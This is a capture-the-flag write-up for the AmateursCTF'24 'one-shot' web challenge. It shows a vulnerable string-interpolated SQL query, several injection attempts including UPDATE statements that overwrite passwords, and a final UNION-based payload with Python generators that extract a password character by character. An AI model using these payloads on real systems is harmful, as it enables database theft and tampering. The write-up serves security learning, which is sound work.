---
CTF: AmateursCTF'24
Category: web
Points: "184"
Date: 2024-04-10
Solved?:
---
----
[<- Home](../../)
### TL;DR

**Flag**

```
amateursCTF{go_union_select_a_life}
```

### Details

Description

> my friend keeps asking me to play OneShot. i haven't, but i made this cool challenge! [http://one-shot.amt.rs](http://one-shot.amt.rs/)
> 


Files
- app.py
- Dockerfile

Attemps: 

```
%' UPDATE table_441483544811af4f SET password = 'e62fc4863d9e3cafc38d76972a054a97' WHERE searched=0; --
```

```
%' OR 1=1; UPDATE table_88b01d0d74557926 SET password = 'e62fc4863d9e3cafc38d76972a054a97' WHERE searched = 0 -- 

```

```
%' UNION SELECT password || '~' || searched FROM table_4d749f6101a21d1d--
```

```
%' UNION SELECT NULL,NULL,NULL–-
```

```

%' UNION SELECT password FROM table_eaaed5b956390598--
```

```
%' AND SUBSTRING((SELECT password FROM table_75252aa6908a7060 WHERE searched = 0), 1, 1) > 'm
```


```
%' UNION SELECT password, searched FROM table_8823994f62b93da3; UPDATE table_8823994f62b93da3 SET password = 'e62fc4863d9e3cafc38d76972a054a97'--
```

```
%'UPDATE table_6c1fc953d26be682 SET password = 'e62fc4863d9e3cafc38d76972a054a97' --
```

---

Sadly I didn't manage to solve this chall in time. But the direction was correct.

In `app.py` we can find possible SQL injection in the `/search` query

```
query = db.execute(f"SELECT password FROM table_{id} WHERE password LIKE '%{request.form['query']}%'")
```

where our request just interpolated into the `db.execute` 

So.... final injection looks like this: 

```
' UNION ALL SELECT substr(password, 1, 1) FROM table_id UNION ALL SELECT substr(password, 2, 1) FROM table_id UNION ALL SELECT substr(password, 3, 1) FROM table_id UNION ALL SELECT substr(password, 4, 1) FROM table_id UNION ALL SELECT substr(password, 5, 1) FROM table_id UNION ALL SELECT substr(password, 6, 1) FROM table_id UNION ALL SELECT substr(password, 7, 1) FROM table_id UNION ALL SELECT substr(password, 8, 1) FROM table_id UNION ALL SELECT substr(password, 9, 1) FROM table_id UNION ALL SELECT substr(password, 10, 1) FROM table_id UNION ALL SELECT substr(password, 11, 1) FROM table_id UNION ALL SELECT substr(password, 12, 1) FROM table_id UNION ALL SELECT substr(password, 13, 1) FROM table_id UNION ALL SELECT substr(password, 14, 1) FROM table_id UNION ALL SELECT substr(password, 15, 1) FROM table_id UNION ALL SELECT substr(password, 16, 1) FROM table_id UNION ALL SELECT substr(password, 17, 1) FROM table_id UNION ALL SELECT substr(password, 18, 1) FROM table_id UNION ALL SELECT substr(password, 19, 1) FROM table_id UNION ALL SELECT substr(password, 20, 1) FROM table_id UNION ALL SELECT substr(password, 21, 1) FROM table_id UNION ALL SELECT substr(password, 22, 1) FROM table_id UNION ALL SELECT substr(password, 23, 1) FROM table_id UNION ALL SELECT substr(password, 24, 1) FROM table_id UNION ALL SELECT substr(password, 25, 1) FROM table_id UNION ALL SELECT substr(password, 26, 1) FROM table_id UNION ALL SELECT substr(password, 27, 1) FROM table_id UNION ALL SELECT substr(password, 28, 1) FROM table_id UNION ALL SELECT substr(password, 29, 1) FROM table_id UNION ALL SELECT substr(password, 30, 1) FROM table_id UNION ALL SELECT substr(password, 31, 1) FROM table_id UNION ALL SELECT substr(password, 32, 1) FROM table_id ; --
```

Or, generate this payload via python

```python
#!/usr/bin/env python3 

def solve():
    table_id = '5a8d19f9d1e05594'
    
    payload_temp: str = "UNION ALL SELECT substr(password, {pos}, 1) FROM table_{table_id}"
    payload: list = []
    
    for i in range(1, 33):
        part = payload_temp.format(pos=i, table_id=table_id)
        payload.append(part)
        
    final_payload = "' " + " ".join(payload) + " ; --"
    return final_payload


if __name__ == "__main__":
    print(solve())
```


Or using list comprehension

```python
#!/usr/bin/env python3 

def solve():
    table_id = '5a8d19f9d1e05594'
    
    payload_parts = [
        f"UNION ALL SELECT substr(password, {i}, 1) FROM table_{table_id}"
        for i in range(1, 33)
    ]
    
    payload = "' " + " ".join(payload_parts) + " ; --"
    return payload


if __name__ == "__main__":
    print(solve())

```

From the hidden input we get our table id

![](assets/Pasted%20image%2020240410152627.png)

Sending this payload in search form, we get the password and, eventually, the flag

![](assets/Pasted%20image%2020240410162826.png)

pass: 32feaa5fa11374353d7bfc4801bb1b29 

![](assets/Pasted%20image%2020240410162907.png)

```
amateursCTF{go_union_select_a_life}
```

